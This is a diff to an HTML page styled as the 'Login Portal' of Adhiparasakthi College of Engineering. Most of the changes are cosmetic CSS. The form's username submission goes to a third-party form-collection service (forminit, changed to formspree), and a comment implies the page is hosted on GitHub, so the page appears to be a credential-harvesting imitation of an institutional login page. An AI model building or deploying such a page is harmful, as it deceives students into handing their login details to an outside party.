@@ -19,7 +19,7 @@
         align-items: center;
         font-family: Arial, sans-serif;
 
-        /* 🌈 Animated background */
+        /* 🌈 Animated Tricolor Background */
         background: linear-gradient(-45deg, #FF9933, #FFFFFF, #138808);
         background-size: 300% 300%;
         animation: bg 8s ease infinite;
@@ -42,8 +42,8 @@
     }
 
     .logo {
-        width: 95px;
-        height: 95px;
+        width: 90px;
+        height: 90px;
         object-fit: cover;
         border-radius: 12px;
         margin-bottom: 10px;
@@ -68,6 +68,12 @@
         border: 1px solid #ccc;
         border-radius: 8px;
         outline: none;
+        transition: 0.3s;
+    }
+
+    input:focus {
+        border-color: #138808;
+        box-shadow: 0 0 8px rgba(19,136,8,0.4);
     }
 
     button {
@@ -79,10 +85,12 @@
         border-radius: 8px;
         font-size: 16px;
         cursor: pointer;
+        transition: 0.3s;
     }
 
     button:hover {
         opacity: 0.9;
+        transform: scale(1.02);
     }
 
     .footer {
@@ -97,13 +105,15 @@
 
 <div class="box">
 
-    <img src="logo.png" class="logo">
+    <!-- LOGO (must be in same GitHub repo) -->
+    <img src="logo.png" alt="College Logo" class="logo">
 
+    <!-- COLLEGE NAME -->
     <h1>ADHIPARASAKTHI COLLEGE OF ENGINEERING</h1>
     <h2>Login Portal</h2>
 
-    <!-- ✅ FORMINIT FORM -->
-    <form action="https://forminit.com/f/sw6bs4wpv3a" method="POST">
+    <!-- FORMSPREE FORM -->
+    <form action="https://formspree.io/f/mojopzgb" method="POST">
 
         <input type="text" name="username" placeholder="Username" required>
 
